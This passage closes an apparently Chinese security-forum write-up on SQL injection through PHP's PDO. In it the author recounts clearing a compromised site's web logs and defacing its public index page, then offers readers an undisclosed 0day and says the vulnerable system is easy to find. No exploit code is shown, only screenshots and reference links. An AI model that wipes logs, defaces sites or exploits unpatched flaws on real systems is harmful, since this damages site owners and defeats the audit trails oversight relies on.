![image-20210526233749316](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1d23bb4e088aaaf3c50c89ac50425e6cfbc78a1a.png)

直接拿捏。

把web日志清理掉

然后给public index页面加点乐子

![image-20210526234200023](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8d908cc5706aa09b4842fc883004e67f526580b8.png)

传统功夫，点到为止。

![image-20210526234615393](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-66f87868885e9b23ff3ea0f978f65aaafb685c0b.png)

0x06 总结
-------

本文主要介绍了通过PDO防范SQL注入的方法和PDO中的注入利用思路，并给大家带来了一个0day实例

你会发现层层抽丝剥茧研究一个模块，并将其中的姿势应用于实战中，是一件很美妙的事情。

相信师傅们是很容易定位到出现本0day的系统的，这个0day就算白送各位师傅的了，希望师傅们也早日成为1024社区会员

![img](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-85e3b3b75f8ed4e90f746defe9b54cbfba45ada3.jpg)

0x07 Refence：
-------------

<https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html>

[https://blog.51cto.com/u\_12332766/2137035](https://blog.51cto.com/u_12332766/2137035)

<https://xz.aliyun.com/t/3950>